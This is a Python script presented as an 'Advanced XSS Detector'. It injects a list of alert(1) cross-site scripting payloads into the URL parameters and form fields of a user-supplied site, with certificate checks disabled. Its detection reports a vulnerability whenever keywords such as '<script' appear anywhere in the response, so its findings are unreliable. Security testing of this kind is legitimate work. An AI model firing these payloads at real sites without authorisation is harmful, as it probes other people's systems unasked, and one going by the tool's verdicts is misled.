import requests
import urllib.parse
from bs4 import BeautifulSoup
import re
import sys
import time

requests.packages.urllib3.disable_warnings()


def show_banner():
    print(r"""
          _______  _______  _______           _______ 
  _      _             _           _            _    _        _          _      
/_/\    /\ \          / /\        / /\         /\ \ /\ \     /\_\       /\ \    
\ \ \   \ \_\        / /  \      / /  \       /  \ \\ \ \   / / /      /  \ \   
 \ \ \__/ / /       / / /\ \__  / / /\ \__   / /\ \ \\ \ \_/ / /      / /\ \ \  
  \ \__ \/_/       / / /\ \___\/ / /\ \___\ / / /\ \_\\ \___/ /      / / /\ \_\ 
   \/_/\__/\       \ \ \ \/___/\ \ \ \/___// /_/_ \/_/ \ \ \_/      / /_/_ \/_/ 
    _/\/__\ \       \ \ \       \ \ \     / /____/\     \ \ \      / /____/\    
   / _/_/\ \ \  _    \ \ \  _    \ \ \   / /\____\/      \ \ \    / /\____\/    
  / / /   \ \ \/_/\__/ / / /_/\__/ / /  / / /______       \ \ \  / / /______    
 / / /    /_/ /\ \/___/ /  \ \/___/ /  / / /_______\       \ \_\/ / /_______\   
 \/_/     \_\/  \_____\/    \_____\/   \/__________/        \/_/\/__________/   

        Aԃʋαɳƈҽԃ XSS Dҽƚҽƈƚσɾ
""")


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<math href=\"javascript:alert(1)\">click</math>"
]


def get_forms(url):
    try:
        resp = requests.get(url, timeout=5, verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = []

        for form in soup.find_all("form"):
            action = form.get("action") or url
            if not action.startswith("http"):
                action = urllib.parse.urljoin(url, action)

            method = form.get("method", "get").lower()
            inputs = {}

            for inp in form.find_all(["input", "textarea"]):
                name = inp.get("name")
                if name:
                    inputs[name] = inp.get("value", "")

            forms.append({
                "action": action,
                "method": method,
                "inputs": inputs
            })

        return forms
    except:
        return []

def is_xss_vulnerable(response_text, payload):
    response = response_text.lower()
    payload = payload.lower()

    indicators = [
        "<script", "onerror", "onload",
        "javascript:", "<img", "<svg"
    ]

    for ind in indicators:
        if ind in payload and ind in response:
            return True
    return False

def test_get_parameter(url, param):
    parsed = urllib.parse.urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for payload in XSS_PAYLOADS:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = payload
        test_url = base_url + "?" + urllib.parse.urlencode(params, doseq=True)

        try:
            resp = requests.get(test_url, timeout=6, verify=False)
            if is_xss_vulnerable(resp.text, payload):
                return True, payload
        except:
            continue

    return False, ""

def test_post_parameter(url, param):
    for payload in XSS_PAYLOADS:
        try:
            resp = requests.post(url, data={param: payload}, timeout=6, verify=False)
            if is_xss_vulnerable(resp.text, payload):
                return True, payload
        except:
            continue

    return False, ""


def run():
    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        print("[!] Missing dependencies. Run: pip install requests beautifulsoup4")
        input("\nPress Enter to return to main menu...")
        return

    show_banner()

    while True:
        target = input("\n[?] Enter target URL: ").strip()
        if not target:
            print("[!] Empty input")
            continue
        if not target.startswith(("http://", "https://")):
            print("[!] URL must start with http:// or https://")
            continue
        break

    print("\n[+] Testing GET parameters...")
    parsed = urllib.parse.urlparse(target)

    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query)
        for param in params:
            print(f" → Testing GET param: {param}")
            vuln, payload = test_get_parameter(target, param)
            if vuln:
                print(f"   [!] XSS FOUND → {payload[:60]}...")
            else:
                print("   [✓] Safe")
    else:
        print(" [i] No GET parameters found")

    print("\n[+] Testing HTML forms...")
    forms = get_forms(target)

    if forms:
        print(f"[✓] Found {len(forms)} form(s)")
        for i, form in enumerate(forms, 1):
            print(f"\n → Form #{i}: {form['method'].upper()} → {form['action']}")
            for param in form["inputs"]:
                print(f"   Testing field: {param}")
                if form["method"] == "post":
                    vuln, payload = test_post_parameter(form["action"], param)
                else:
                    test_url = form["action"] + "?" + urllib.parse.urlencode({param: "test"})
                    vuln, payload = test_get_parameter(test_url, param)

                if vuln:
                    print(f"     [!] XSS FOUND → {payload[:60]}...")
                else:
                    print("     [✓] Safe")
    else:
        print("[i] No forms found")

    print("\n[✓] XSS analysis completed")
    input("\nPress Enter to return to main menu...")
    return


if __name__ == "__main__":
    run()
